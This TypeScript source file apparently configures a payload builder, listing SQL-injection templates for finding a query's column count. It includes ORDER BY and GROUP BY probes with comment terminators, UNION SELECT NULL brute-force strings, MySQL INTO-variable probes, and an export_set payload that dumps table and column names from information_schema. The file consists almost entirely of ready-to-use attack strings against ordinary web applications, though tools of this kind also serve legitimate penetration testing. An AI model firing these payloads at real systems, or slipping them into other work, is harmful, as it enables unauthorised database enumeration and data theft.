import { BuilderSubcategory } from '../../types';

export const orderSubcategory: BuilderSubcategory = {
  id: 'order',
  label: 'Column count',
  description: 'Column count determination templates (ORDER BY, GROUP BY, UNION NULL, INTO vars)',
  templates: [
    {
      id: 'col-count-order-by',
      name: 'ORDER BY',
      description: 'Standard ORDER BY clause with dynamic column number',
      content: 'ORDER BY 10'
    },
    {
      id: 'col-count-plus-order-by',
      name: '+ORDER+BY+',
      description: 'URL-spaced +ORDER+BY+ clause with dynamic column number',
      content: '+ORDER+BY+10'
    },
    {
      id: 'col-count-order-by-comment',
      name: 'ORDER BY N-- -',
      description: 'ORDER BY with trailing SQL comment -- -',
      content: 'ORDER BY 10-- -'
    },
    {
      id: 'col-count-plus-order-by-comment',
      name: '+ORDER+BY+N--+',
      description: 'URL-spaced +ORDER+BY+ with trailing comment --+',
      content: '+ORDER+BY+10--+'
    },
    {
      id: 'col-count-group-by',
      name: 'GROUP BY',
      description: 'Standard GROUP BY clause with dynamic column number',
      content: 'GROUP BY 10'
    },
    {
      id: 'col-count-plus-group-by',
      name: '+GROUP+BY+',
      description: 'URL-spaced +GROUP+BY+ clause with dynamic column number',
      content: '+GROUP+BY+10'
    },
    {
      id: 'col-count-group-by-comment',
      name: 'GROUP BY N-- -',
      description: 'GROUP BY with trailing SQL comment -- -',
      content: 'GROUP BY 10-- -'
    },
    {
      id: 'col-count-plus-group-by-comment',
      name: '+GROUP+BY+N--+',
      description: 'URL-spaced +GROUP+BY+ with trailing comment --+',
      content: '+GROUP+BY+10--+'
    },
    {
      id: 'col-count-union-null',
      name: 'UNION SELECT NULL (Brute Force Count)',
      description: 'Brute force column count using N NULLs',
      content: 'UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'
    },
    {
      id: 'col-count-union-null-comment',
      name: 'UNION SELECT NULL-- -',
      description: 'UNION SELECT with N NULLs and trailing SQL comment',
      content: 'UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'
    },
    {
      id: 'col-count-into-vars',
      name: 'LIMIT 1 INTO @v1..@vN (Session Vars)',
      description: 'Detect column count mismatch using N MySQL session variables',
      content: 'LIMIT 1 INTO @v1,@v2,@v3,@v4,@v5,@v6,@v7,@v8,@v9,@v10'
    },
    {
      id: 'col-count-select-export-set',
      name: '(SELECT * FROM*)',
      description: 'Select export_set column count query',
      content: "'+AND+(SELECT * FROM (Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))=(SELECT 1)--+"
    }
  ]
};
